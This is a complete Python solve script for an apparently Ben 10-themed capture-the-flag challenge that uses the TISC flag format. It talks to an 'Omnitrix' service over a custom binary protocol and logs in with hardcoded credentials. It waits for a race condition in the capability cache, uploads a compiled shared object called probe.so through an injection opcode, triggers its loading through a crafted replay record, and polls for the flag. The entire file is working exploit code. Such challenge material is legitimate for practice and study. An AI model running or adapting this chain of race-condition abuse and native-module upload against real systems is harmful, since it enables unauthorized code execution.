#!/usr/bin/env python3
import socket
import struct
import time
import os
from pathlib import Path

HOST = os.environ.get("OMNI_HOST", "127.0.0.1")
PORT = int(os.environ.get("OMNI_PORT", "7878"))
PROBE_FILE = Path(__file__).with_name("probe.so")


def field(data):
    return struct.pack(">H", len(data)) + data


def recvn(sock, length):
    data = b""
    while len(data) < length:
        chunk = sock.recv(length - len(data))
        if not chunk:
            raise EOFError("connection closed")
        data += chunk
    return data


class Client:
    def __init__(self):
        self.sock = socket.create_connection((HOST, PORT))
        self.rid = 0

    def request(self, opcode, body=b""):
        self.rid += 1
        header = struct.pack(">4sBBHII", b"OMNI", 1, 0,
                             opcode, self.rid, len(body))
        self.sock.sendall(header + body)
        response = recvn(self.sock, 16)
        magic, version, flags, op, rid, length = struct.unpack(
            ">4sBBHII", response
        )
        body = recvn(self.sock, length)
        print(f"<- op=0x{op:04x} flags=0x{flags:02x} "
              f"id={rid} length={length}")
        return flags, body

    def auth(self):
        flags, body = self.request(
            0x10,
            field(b"ben.tennyson") + field(b"its-hero-time"),
        )
        if flags != 1:
            raise RuntimeError(body)
        print(f"[+] Authenticated: {body[:16].hex()}")

    def lease(self, capability):
        flags, body = self.request(
            0x20,
            field(capability) + struct.pack(">I", 300),
        )
        if flags != 1:
            raise RuntimeError(body)
        lease = body[:16]
        print(f"[+] Lease {capability.decode()}: {lease.hex()}")
        return lease


def parse_transform(body):
    if len(body) < 38:
        return b"", body
    offset = 32
    name_length = struct.unpack(">H", body[offset:offset + 2])[0]
    offset += 2
    name = body[offset:offset + name_length]
    offset += name_length
    output_length = struct.unpack(">I", body[offset:offset + 4])[0]
    offset += 4
    return name, body[offset:offset + output_length]


def make_orep(action, template, variables):
    output = b"OREP" + struct.pack(">H", 1)
    output += field(action) + field(template)
    output += struct.pack(">H", len(variables))
    for key, value in variables:
        output += field(key) + field(value)
    return output


def upload(client, dna_lease, path, contents):
    args = field(path) + contents
    request = (
        dna_lease
        + field(b"codon.stream.inject")
        + struct.pack(">II", 0, len(args))
        + args
    )
    flags, body = client.request(0x41, request)
    if flags != 1:
        raise RuntimeError(f"upload frame rejected: {body!r}")
    name, output = parse_transform(body)
    print(f"[+] {name.decode(errors='replace')}: "
          f"{output.decode(errors='replace')}")
    if b"error:" in output.lower() or b"rejected" in output.lower():
        raise RuntimeError(output.decode(errors="replace"))


def recall(client, scan_lease, label):
    flags, body = client.request(0x53, scan_lease + field(label))
    if flags != 1:
        return None, body
    if len(body) < 4:
        return b"", body
    length = struct.unpack(">I", body[:4])[0]
    return body[4:4 + length], body


def main():
    if not PROBE_FILE.is_file():
        raise SystemExit("probe.so is missing; compile probe.c first")

    print(f"[*] Connecting to {HOST}:{PORT}")
    module = PROBE_FILE.read_bytes()
    print(f"[*] Loaded {PROBE_FILE}: {len(module)} bytes")

    client = Client()
    client.auth()

    flags, diag = client.request(0x51)
    if flags != 1 or len(diag) < 6:
        raise SystemExit(f"diagnostic failed: {diag!r}")
    mask = struct.unpack(">I", diag[2:6])[0]
    print(f"[*] Policy mask: 0x{mask:08x}")
    if mask != 0x3F4:
        raise SystemExit("race state is not active (expected 0x000003f4)")

    dna = client.lease(b"dna.shift")
    scan = client.lease(b"omnitrix.scan")
    print("[*] Waiting for the capability cache...")
    time.sleep(1.5)

    print("[*] Uploading the probe module...")
    upload(client, dna, b"probe.so", module)

    engage = make_orep(
        b"scan",
        b"",
        [
            (b"band", b"engage"),
            (b"payload", b"probe.so"),
        ],
    )
    print("[*] Uploading the engage replay...")
    upload(client, dna, b"replay/engage1", engage)

    print("[*] Engaging probe.so...")
    output, raw = recall(client, scan, b"engage1")
    if output is None:
        raise SystemExit(f"engage recall failed: {raw!r}")
    print(f"[+] Engage response: {output!r}")

    print("[*] Waiting for the protected flag helper...")
    for attempt in range(1, 16):
        time.sleep(1)
        output, raw = recall(client, scan, b"result")
        if output is None:
            print(f"    result not ready ({attempt}/15)")
            continue

        text = output.decode("utf-8", errors="replace")
        print(f"[+] Result replay: {text}")
        start = text.find("TISC{")
        if start >= 0:
            end = text.find("}", start)
            if end >= 0:
                print("\nACTUAL FLAG")
                print("-----------")
                print(text[start:end + 1])
                return

    print("[-] No result replay appeared.")
    print("[-] Check the Omnitrix terminal for playback/module errors.")


if __name__ == "__main__":
    main()
